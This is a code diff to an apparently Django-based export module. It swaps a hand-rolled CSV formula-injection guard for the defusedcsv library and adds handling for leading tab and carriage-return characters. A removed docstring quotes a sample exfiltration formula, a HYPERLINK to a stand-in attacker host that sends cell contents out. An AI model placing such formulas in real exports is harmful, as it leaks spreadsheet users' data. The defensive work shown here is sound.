@@ -5,18 +5,36 @@ Kept out of views.py so each piece is unit-testable without an HTTP
 request. Everything here writes private-zone rows through the explicit
 `all_objects` manager (creation with a known user) or reads through
 `.objects.for_user(user)` (tenant-scoped) — the contract from
-coverage_web/tenancy.py. Import/export use only the stdlib `csv` module
-(no pandas), per the task's hard constraint.
+coverage_web/tenancy.py. Import/export use only the stdlib-compatible `csv`
+module (no pandas), per the task's hard constraint — `defusedcsv` (see the
+import below) is a drop-in replacement of that module, not a departure from
+it: same `reader`/`writer`/`DictReader` surface, with `writer.writerow`
+additionally neutralising formula-leading cells before they reach the file.
 """
 
 from __future__ import annotations
 
-import csv
 import io
 import json as _json
 import re
 import zipfile
 from dataclasses import dataclass, field
+
+# Drop-in for the stdlib `csv` module used everywhere below (reader for
+# import, writer for export) — same surface, but `writer`'s `writerow`/
+# `writerows` neutralise a cell that would read as a spreadsheet formula
+# before it reaches the file. Formerly hand-rolled as `_safe_cell()` (see
+# git log "Stop a stranger's email subject running as a formula in the
+# export"); replaced with the maintained library rather than carrying a
+# bespoke implementation of a well-known defense. One gap versus the old
+# guard, closed below rather than left silent: defusedcsv's own trigger set
+# is `@+-=|%` and does not include a leading tab or carriage return, both of
+# which a spreadsheet strips on paste before formula-detection runs, handing
+# the character after them the same power as a leading `=`. See
+# `_neutralise_tab_or_cr_lead` below and
+# `test_a_formula_in_a_cell_exports_as_inert_text` in test_export.py, which
+# exercises both defusedcsv's own set and this one live.
+from defusedcsv import csv
 
 from django.conf import settings
 from django.contrib.sessions.models import Session
@@ -617,49 +635,52 @@ def _dt(value) -> str:
     return value.isoformat() if value else ""
 
 
-# Characters that make a spreadsheet read a cell as a formula rather than as
-# text. `=`, `+`, `-` and `@` are the four Excel/LibreOffice/Sheets act on;
-# a leading tab or carriage return gets stripped on paste and hands the next
-# character the same power.
-_FORMULA_LEAD = ("=", "+", "-", "@", "\t", "\r")
+# The two formula-injection lead characters defusedcsv's own writer does
+# NOT neutralise (checked live against defusedcsv 0.1.x: `writer.writerow`
+# leaves a cell starting with either of these untouched, while it does
+# prefix a leading `@`/`+`/`-`/`=`/`|`/`%` with a single quote). A
+# spreadsheet strips a leading tab or carriage return on paste, before its
+# own formula-detection runs, handing the character after them the same
+# power as a leading `=` -- so a cell that starts with one of these still
+# needs the guard applied by hand.
+_UNCOVERED_FORMULA_LEAD = ("\t", "\r")
 
-# A cell that is just a number is not a formula in any spreadsheet, so
-# leaving it alone costs nothing in safety and keeps a numeric column
-# sortable. Everything else is quoted.
-_PLAIN_NUMBER = re.compile(r"^[+-]?\d+(?:\.\d+)?$")
 
+def _neutralise_tab_or_cr_lead(value):
+    """The one gap in defusedcsv's own escaping (see `_UNCOVERED_FORMULA_LEAD`
+    above), closed the same way defusedcsv closes the rest: prefix with a
+    single quote, which defusedcsv's writer then passes through untouched
+    (`'` is not in its own trigger set) rather than double-escaping.
 
-def _safe_cell(value):
-    """One exported cell, neutralised against CSV formula injection.
-
-    Not every character in an export is written by the student. A third
+    Not every character in an export is written by the student -- a third
     party's email Subject header reaches `Touch.note` verbatim through the
     Gmail capture path (capture/gmail_live.py builds evidence text like
     `f"Sent: {subject}"`), so anyone who can send that student mail can
-    choose the first character of a cell in their export. Left as-is,
-    `=HYPERLINK("http://attacker/?x="&A1,"click")` or a DDE payload runs on
-    the student's own machine the moment they open the file in Excel --
-    the CSV never touched a browser, so none of the app's escaping applies.
-
-    The mitigation is OWASP's: prefix a leading formula character with a
-    single quote. The spreadsheet shows the original text and evaluates
-    nothing. Applied here, in the one helper every export builder goes
-    through, so a new export cannot ship without it.
+    choose the first character of a cell in their export. See git log "Stop
+    a stranger's email subject running as a formula in the export".
     """
     text = "" if value is None else str(value)
-    if text[:1] in _FORMULA_LEAD and not _PLAIN_NUMBER.match(text):
+    if text[:1] in _UNCOVERED_FORMULA_LEAD:
         return "'" + text
     return value
 
 
 def _csv(columns: list[str], rows) -> str:
-    """Header + rows -> CSV text. Every builder below is this plus a query."""
+    """Header + rows -> CSV text. Every builder below is this plus a query.
+
+    `writer.writerow` is defusedcsv's, which neutralises a cell that would
+    read as a spreadsheet formula (leading `@`/`+`/`-`/`=`/`|`/`%`) before it
+    reaches the file -- see the module docstring's import comment. The one
+    gap it leaves (a leading tab/carriage return) is closed by
+    `_neutralise_tab_or_cr_lead` first, on every cell, so a new export
+    builder cannot ship without either guard.
+    """
     buf = io.StringIO()
     writer = csv.writer(buf)
     # Column headers are literals declared in this module, never user text.
     writer.writerow(columns)
     for row in rows:
-        writer.writerow([_safe_cell(cell) for cell in row])
+        writer.writerow([_neutralise_tab_or_cr_lead(cell) for cell in row])
     return buf.getvalue()
 
 
